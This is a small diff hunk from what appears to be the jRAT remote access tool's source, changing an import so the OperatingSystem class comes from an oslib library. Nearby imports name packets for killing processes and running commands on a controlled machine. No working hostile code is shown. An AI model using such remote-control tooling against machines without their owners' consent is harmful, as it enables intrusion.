@@ -18,7 +18,8 @@ import se.jrat.client.packets.outgoing.Packet20KillProcess;
 import se.jrat.client.packets.outgoing.Packet38RunCommand;
 import se.jrat.client.ui.renderers.table.ProcessTableRenderer;
 import se.jrat.client.utils.Utils;
-import se.jrat.common.OperatingSystem;
+
+import com.redpois0n.oslib.OperatingSystem;
 
 
 @SuppressWarnings("serial")
